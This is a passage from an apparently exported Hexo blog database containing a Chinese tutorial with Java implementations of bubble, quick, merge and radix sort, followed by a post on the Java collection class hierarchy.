title=\"5&#x3001;&#x5192;&#x6CE1;&#x6392;&#x5E8F;\"></a>5&#x3001;&#x5192;&#x6CE1;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5728;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4E2D;&#xFF0C;&#x5BF9;&#x5F53;&#x524D;&#x8FD8;&#x672A;&#x6392;&#x597D;&#x5E8F;&#x7684;&#x8303;&#x56F4;&#x5185;&#x7684;&#x5168;&#x90E8;&#x6570;&#xFF0C;&#x81EA;&#x4E0A;&#x800C;&#x4E0B;&#x5BF9;&#x76F8;&#x90BB;&#x7684;&#x4E24;&#x4E2A;&#x6570;&#x4F9D;&#x6B21;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x548C;&#x8C03;&#x6574;&#xFF0C;&#x8BA9;&#x8F83;&#x5927;&#x7684;&#x6570;&#x5F80;&#x4E0B;&#x6C89;&#xFF0C;&#x8F83;&#x5C0F;&#x7684;&#x5F80;&#x4E0A;&#x5192;&#x3002;&#x5373;&#xFF1A;&#x6BCF;&#x5F53;&#x4E24;&#x76F8;&#x90BB;&#x7684;&#x6570;&#x6BD4;&#x8F83;&#x540E;&#x53D1;&#x73B0;&#x5B83;&#x4EEC;&#x7684;&#x6392;&#x5E8F;&#x4E0E;&#x6392;&#x5E8F;&#x8981;&#x6C42;&#x76F8;&#x53CD;&#x65F6;&#xFF0C;&#x5C31;&#x5C06;&#x5B83;&#x4EEC;&#x4E92;&#x6362;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/9.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class bubbleSort {  </span><br><span class=\"line\">public  <span class=\"function\"><span class=\"title\">bubbleSort</span></span>(){  </span><br><span class=\"line\">     int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">    int temp=0;  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length-1;i++){  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int j=0;j&lt;a.length-1-i;j++){  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(a[j]&gt;a[j+1]){  </span><br><span class=\"line\">            temp=a[j];  </span><br><span class=\"line\">            a[j]=a[j+1];  </span><br><span class=\"line\">            a[j+1]=temp;  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">    System.out.println(a[i]);     </span><br><span class=\"line\">}  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"6&#x3001;&#x5FEB;&#x901F;&#x6392;&#x5E8F;\"><a href=\"#6&#x3001;&#x5FEB;&#x901F;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"6&#x3001;&#x5FEB;&#x901F;&#x6392;&#x5E8F;\"></a>6&#x3001;&#x5FEB;&#x901F;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x57FA;&#x51C6;&#x5143;&#x7D20;,&#x901A;&#x5E38;&#x9009;&#x62E9;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x6216;&#x8005;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;,&#x901A;&#x8FC7;&#x4E00;&#x8D9F;&#x626B;&#x63CF;&#xFF0C;&#x5C06;&#x5F85;&#x6392;&#x5E8F;&#x5217;&#x5206;&#x6210;&#x4E24;&#x90E8;&#x5206;,&#x4E00;&#x90E8;&#x5206;&#x6BD4;&#x57FA;&#x51C6;&#x5143;&#x7D20;&#x5C0F;,&#x4E00;&#x90E8;&#x5206;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x57FA;&#x51C6;&#x5143;&#x7D20;,&#x6B64;&#x65F6;&#x57FA;&#x51C6;&#x5143;&#x7D20;&#x5728;&#x5176;&#x6392;&#x597D;&#x5E8F;&#x540E;&#x7684;&#x6B63;&#x786E;&#x4F4D;&#x7F6E;,&#x7136;&#x540E;&#x518D;&#x7528;&#x540C;&#x6837;&#x7684;&#x65B9;&#x6CD5;&#x9012;&#x5F52;&#x5730;&#x6392;&#x5E8F;&#x5212;&#x5206;&#x7684;&#x4E24;&#x90E8;&#x5206;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/10.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class quickSort {  </span><br><span class=\"line\">  int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">public  <span class=\"function\"><span class=\"title\">quickSort</span></span>(){  </span><br><span class=\"line\">    quick(a);  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">        System.out.println(a[i]);  </span><br><span class=\"line\">}  </span><br><span class=\"line\">public int getMiddle(int[] list, int low, int high) {     </span><br><span class=\"line\">            int tmp = list[low];    //&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x4F5C;&#x4E3A;&#x4E2D;&#x8F74;     </span><br><span class=\"line\">            <span class=\"keyword\">while</span> (low &lt; high) {     </span><br><span class=\"line\">                <span class=\"keyword\">while</span> (low &lt; high &amp;&amp; list[high] &gt;= tmp) {     </span><br><span class=\"line\"></span><br><span class=\"line\">      high--;     </span><br><span class=\"line\">                }     </span><br><span class=\"line\">                list[low] = list[high];   //&#x6BD4;&#x4E2D;&#x8F74;&#x5C0F;&#x7684;&#x8BB0;&#x5F55;&#x79FB;&#x5230;&#x4F4E;&#x7AEF;     </span><br><span class=\"line\">                <span class=\"keyword\">while</span> (low &lt; high &amp;&amp; list[low] &lt;= tmp) {     </span><br><span class=\"line\">                    low++;     </span><br><span class=\"line\">                }     </span><br><span class=\"line\">                list[high] = list[low];   //&#x6BD4;&#x4E2D;&#x8F74;&#x5927;&#x7684;&#x8BB0;&#x5F55;&#x79FB;&#x5230;&#x9AD8;&#x7AEF;     </span><br><span class=\"line\">            }     </span><br><span class=\"line\">           list[low] = tmp;              //&#x4E2D;&#x8F74;&#x8BB0;&#x5F55;&#x5230;&#x5C3E;     </span><br><span class=\"line\">            <span class=\"built_in\">return</span> low;                   //&#x8FD4;&#x56DE;&#x4E2D;&#x8F74;&#x7684;&#x4F4D;&#x7F6E;     </span><br><span class=\"line\">        }    </span><br><span class=\"line\">public void _quickSort(int[] list, int low, int high) {     </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (low &lt; high) {     </span><br><span class=\"line\">               int middle = getMiddle(list, low, high);  //&#x5C06;list&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x4E00;&#x5206;&#x4E3A;&#x4E8C;     </span><br><span class=\"line\">                _quickSort(list, low, middle - 1);        //&#x5BF9;&#x4F4E;&#x5B57;&#x8868;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#x6392;&#x5E8F;     </span><br><span class=\"line\">               _quickSort(list, middle + 1, high);       //&#x5BF9;&#x9AD8;&#x5B57;&#x8868;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#x6392;&#x5E8F;     </span><br><span class=\"line\">            }     </span><br><span class=\"line\">        }   </span><br><span class=\"line\">public void quick(int[] a2) {     </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (a2.length &gt; 0) {    //&#x67E5;&#x770B;&#x6570;&#x7EC4;&#x662F;&#x5426;&#x4E3A;&#x7A7A;     </span><br><span class=\"line\">                _quickSort(a2, 0, a2.length - 1);     </span><br><span class=\"line\">        }     </span><br><span class=\"line\">       }   </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"7&#x3001;&#x5F52;&#x5E76;&#x6392;&#x5E8F;\"><a href=\"#7&#x3001;&#x5F52;&#x5E76;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"7&#x3001;&#x5F52;&#x5E76;&#x6392;&#x5E8F;\"></a>7&#x3001;&#x5F52;&#x5E76;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x6392;&#x5E8F;&#xFF1A;&#x5F52;&#x5E76;&#xFF08;Merge&#xFF09;&#x6392;&#x5E8F;&#x6CD5;&#x662F;&#x5C06;&#x4E24;&#x4E2A;&#xFF08;&#x6216;&#x4E24;&#x4E2A;&#x4EE5;&#x4E0A;&#xFF09;&#x6709;&#x5E8F;&#x8868;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6709;&#x5E8F;&#x8868;&#xFF0C;&#x5373;&#x628A;&#x5F85;&#x6392;&#x5E8F;&#x5E8F;&#x5217;&#x5206;&#x4E3A;&#x82E5;&#x5E72;&#x4E2A;&#x5B50;&#x5E8F;&#x5217;&#xFF0C;&#x6BCF;&#x4E2A;&#x5B50;&#x5E8F;&#x5217;&#x662F;&#x6709;&#x5E8F;&#x7684;&#x3002;&#x7136;&#x540E;&#x518D;&#x628A;&#x6709;&#x5E8F;&#x5B50;&#x5E8F;&#x5217;&#x5408;&#x5E76;&#x4E3A;&#x6574;&#x4F53;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/11.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.Arrays;  </span><br><span class=\"line\"></span><br><span class=\"line\">public class mergingSort {  </span><br><span class=\"line\">int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">public  <span class=\"function\"><span class=\"title\">mergingSort</span></span>(){  </span><br><span class=\"line\">    sort(a,0,a.length-1);  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">        System.out.println(a[i]);  </span><br><span class=\"line\">}  </span><br><span class=\"line\">public void sort(int[] data, int left, int right) {  </span><br><span class=\"line\">    // TODO Auto-generated method stub  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(left&lt;right){  </span><br><span class=\"line\">        //&#x627E;&#x51FA;&#x4E2D;&#x95F4;&#x7D22;&#x5F15;  </span><br><span class=\"line\">        int center=(left+right)/2;  </span><br><span class=\"line\">        //&#x5BF9;&#x5DE6;&#x8FB9;&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x9012;&#x5F52;  </span><br><span class=\"line\">        sort(data,left,center);  </span><br><span class=\"line\">        //&#x5BF9;&#x53F3;&#x8FB9;&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x9012;&#x5F52;  </span><br><span class=\"line\">        sort(data,center+1,right);  </span><br><span class=\"line\">        //&#x5408;&#x5E76;  </span><br><span class=\"line\">        merge(data,left,center,right);  </span><br><span class=\"line\"></span><br><span class=\"line\">    }  </span><br><span class=\"line\">}  </span><br><span class=\"line\">public void merge(int[] data, int left, int center, int right) {  </span><br><span class=\"line\">    // TODO Auto-generated method stub  </span><br><span class=\"line\">    int [] tmpArr=new int[data.length];  </span><br><span class=\"line\">    int mid=center+1;  </span><br><span class=\"line\">    //third&#x8BB0;&#x5F55;&#x4E2D;&#x95F4;&#x6570;&#x7EC4;&#x7684;&#x7D22;&#x5F15;  </span><br><span class=\"line\">    int third=left;  </span><br><span class=\"line\">    int tmp=left;  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(left&lt;=center&amp;&amp;mid&lt;=right){  </span><br><span class=\"line\"></span><br><span class=\"line\">   //&#x4ECE;&#x4E24;&#x4E2A;&#x6570;&#x7EC4;&#x4E2D;&#x53D6;&#x51FA;&#x6700;&#x5C0F;&#x7684;&#x653E;&#x5165;&#x4E2D;&#x95F4;&#x6570;&#x7EC4;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(data[left]&lt;=data[mid]){  </span><br><span class=\"line\">            tmpArr[third++]=data[left++];  </span><br><span class=\"line\">        }<span class=\"keyword\">else</span>{  </span><br><span class=\"line\">            tmpArr[third++]=data[mid++];  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    //&#x5269;&#x4F59;&#x90E8;&#x5206;&#x4F9D;&#x6B21;&#x653E;&#x5165;&#x4E2D;&#x95F4;&#x6570;&#x7EC4;  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(mid&lt;=right){  </span><br><span class=\"line\">        tmpArr[third++]=data[mid++];  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(left&lt;=center){  </span><br><span class=\"line\">        tmpArr[third++]=data[left++];  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    //&#x5C06;&#x4E2D;&#x95F4;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x590D;&#x5236;&#x56DE;&#x539F;&#x6570;&#x7EC4;  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(tmp&lt;=right){  </span><br><span class=\"line\">        data[tmp]=tmpArr[tmp++];  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    System.out.println(Arrays.toString(data));  </span><br><span class=\"line\">}  </span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"8&#x3001;&#x57FA;&#x6570;&#x6392;&#x5E8F;\"><a href=\"#8&#x3001;&#x57FA;&#x6570;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"8&#x3001;&#x57FA;&#x6570;&#x6392;&#x5E8F;\"></a>8&#x3001;&#x57FA;&#x6570;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5C06;&#x6240;&#x6709;&#x5F85;&#x6BD4;&#x8F83;&#x6570;&#x503C;&#xFF08;&#x6B63;&#x6574;&#x6570;&#xFF09;&#x7EDF;&#x4E00;&#x4E3A;&#x540C;&#x6837;&#x7684;&#x6570;&#x4F4D;&#x957F;&#x5EA6;&#xFF0C;&#x6570;&#x4F4D;&#x8F83;&#x77ED;&#x7684;&#x6570;&#x524D;&#x9762;&#x8865;&#x96F6;&#x3002;&#x7136;&#x540E;&#xFF0C;&#x4ECE;&#x6700;&#x4F4E;&#x4F4D;&#x5F00;&#x59CB;&#xFF0C;&#x4F9D;&#x6B21;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x6392;&#x5E8F;&#x3002;&#x8FD9;&#x6837;&#x4ECE;&#x6700;&#x4F4E;&#x4F4D;&#x6392;&#x5E8F;&#x4E00;&#x76F4;&#x5230;&#x6700;&#x9AD8;&#x4F4D;&#x6392;&#x5E8F;&#x5B8C;&#x6210;&#x4EE5;&#x540E;,&#x6570;&#x5217;&#x5C31;&#x53D8;&#x6210;&#x4E00;&#x4E2A;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/12.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.ArrayList;  </span><br><span class=\"line\">import java.util.List;  </span><br><span class=\"line\"></span><br><span class=\"line\">public class radixSort {  </span><br><span class=\"line\">    int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,101,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">public <span class=\"function\"><span class=\"title\">radixSort</span></span>(){  </span><br><span class=\"line\">    sort(a);  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">        System.out.println(a[i]);  </span><br><span class=\"line\">}  </span><br><span class=\"line\">public  void sort(int[] array){     </span><br><span class=\"line\"></span><br><span class=\"line\">            //&#x9996;&#x5148;&#x786E;&#x5B9A;&#x6392;&#x5E8F;&#x7684;&#x8D9F;&#x6570;;     </span><br><span class=\"line\">        int max=array[0];     </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int i=1;i&lt;array.length;i++){     </span><br><span class=\"line\">               <span class=\"keyword\">if</span>(array[i]&gt;max){     </span><br><span class=\"line\">               max=array[i];     </span><br><span class=\"line\">               }     </span><br><span class=\"line\">            }     </span><br><span class=\"line\"></span><br><span class=\"line\">    int time=0;     </span><br><span class=\"line\">           //&#x5224;&#x65AD;&#x4F4D;&#x6570;;     </span><br><span class=\"line\">            <span class=\"keyword\">while</span>(max&gt;0){     </span><br><span class=\"line\">               max/=10;     </span><br><span class=\"line\">                time++;     </span><br><span class=\"line\">            }     </span><br><span class=\"line\"></span><br><span class=\"line\">        //&#x5EFA;&#x7ACB;10&#x4E2A;&#x961F;&#x5217;;     </span><br><span class=\"line\">            List&lt;ArrayList&gt; queue=new ArrayList&lt;ArrayList&gt;();     </span><br><span class=\"line\">            <span class=\"keyword\">for</span>(int i=0;i&lt;10;i++){     </span><br><span class=\"line\">                ArrayList&lt;Integer&gt; queue1=new ArrayList&lt;Integer&gt;();   </span><br><span class=\"line\">                queue.add(queue1);     </span><br><span class=\"line\">        }     </span><br><span class=\"line\"></span><br><span class=\"line\">            //&#x8FDB;&#x884C;time&#x6B21;&#x5206;&#x914D;&#x548C;&#x6536;&#x96C6;;     </span><br><span class=\"line\">            <span class=\"keyword\">for</span>(int i=0;i&lt;time;i++){     </span><br><span class=\"line\"></span><br><span class=\"line\">                //&#x5206;&#x914D;&#x6570;&#x7EC4;&#x5143;&#x7D20;;     </span><br><span class=\"line\">               <span class=\"keyword\">for</span>(int j=0;j&lt;array.length;j++){     </span><br><span class=\"line\">                    //&#x5F97;&#x5230;&#x6570;&#x5B57;&#x7684;&#x7B2C;time+1&#x4F4D;&#x6570;;   </span><br><span class=\"line\">                   int x=array[j]%(int)Math.pow(10, i+1)/(int)Math.pow(10, i);  </span><br><span class=\"line\">                   ArrayList&lt;Integer&gt; queue2=queue.get(x);  </span><br><span class=\"line\">                   queue2.add(array[j]);  </span><br><span class=\"line\">                   queue.set(x, queue2);  </span><br><span class=\"line\">            }     </span><br><span class=\"line\">                int count=0;//&#x5143;&#x7D20;&#x8BA1;&#x6570;&#x5668;;     </span><br><span class=\"line\">            //&#x6536;&#x96C6;&#x961F;&#x5217;&#x5143;&#x7D20;;     </span><br><span class=\"line\">                <span class=\"keyword\">for</span>(int k=0;k&lt;10;k++){   </span><br><span class=\"line\">                <span class=\"keyword\">while</span>(queue.get(k).size()&gt;0){  </span><br><span class=\"line\">                    ArrayList&lt;Integer&gt; queue3=queue.get(k);  </span><br><span class=\"line\">                        array[count]=queue3.get(0);     </span><br><span class=\"line\">                        queue3.remove(0);  </span><br><span class=\"line\">                    count++;  </span><br><span class=\"line\">              }     </span><br><span class=\"line\">            }     </span><br><span class=\"line\">          }     </span><br><span class=\"line\"></span><br><span class=\"line\">   }    </span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>"},{"title":"Java集合类从属关系","date":"2016-06-11T13:18:00.000Z","toc":false,"_content":"\n> 有些东西不整理，实在太容易忘了。\n\n### 1、集合关系图\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/1.png)\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/2.png)\n<!-- more -->\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/3.png)\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/4.png)\n\n**Java的集合分为了四类：List Set Queue Map**，每类都有不同的实现，有基于数组实现的，有基于链表实现的，有基于xx树实现的，不同的实现虽在功能上可以相互替代但都有各自的应用场景，如基于数组的实现擅长快速遍历，基于链表的实现擅长随机写，基于树的实现可排序等等。\n\nJDK1.5及以后还添加了很多实用的功能，如ConcurrentMap、CopyOnWriteArray、ListBlockingQueue、BlockingDeque、CopyOnWriteArraySet等等，另外，Collections工具类也提供了很多方便的API，如 synchronizedCollection、binarySearch、checkedCollection、copy、indexOfSubList、reverse、singletonList等等，这给我们提供了非常多的选择。\n\n多线程下使用，需要保证线程安全，读操作远大与写操作，例如缓存系统，使用CopyOnWriteArray...也许会是不错的选择，此外Concurrent...也不错。\n如果在多线程间还需要协作通信等，那么阻塞队列BlockingQueue、BlockingDeque（双端队列，既可以在队列的前端进行插入删除操作，也可以在队列的后端进行插入删除操作，具有队列和栈的特征）会是最合适的选择。\n如果这还不够，可以使用带优先级的PriorityBlockingQueue更秒的地方我们还可以使用DelayQueue延迟队列，如果你的创造力够强的话，用DelayQueue来实现一些超时管理（如Session超时处理、请求超时处理）会有非常优雅和奇妙的效果 。\n\n如果不会涉及多线程并发访问，如方法内部、同步访问区等，如果有随机写的需求可以考虑LinkedList或LinkedHashSet\n如果需要快速检索元素是否已经存在于集合内可以考虑使用HashMap、HashSet\n如果我们需要非常频繁且高效的遍历则应该采用ArrayList\n如果我们需要排序，那么就必需要选择TreeMap、TreeSet喽\n另外，LinkedList同时实现了List、Deque、Queue接口，用其来实现Stack也是可以的。\n\n### 2、《编程思想》相关概念\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/5.png)\n![图片6](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/6.png)\n\n#### 3、集合类为什么也称为容器类？\n![图片7](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/7.png)\n","source":"_posts/Java集合类从属关系.md","raw":"---\ntitle: Java集合类从属关系\ncategories:\n  - WEB后端\ntags:\n  - 集合\n  - 疑难杂症\ndate: 2016-6-11 21:18:00\ntoc: false\n\n---\n\n> 有些东西不整理，实在太容易忘了。\n\n### 1、集合关系图\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/1.png)\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/2.png)\n<!-- more -->\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/3.png)\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/Java%E9%9B%86%E5%90%88%E7%B1%BB%E4%BB%8E%E5%B1%9E%E5%85%B3%E7%B3%BB/4.png)\n\n**Java的集合分为了四类：List Set Queue 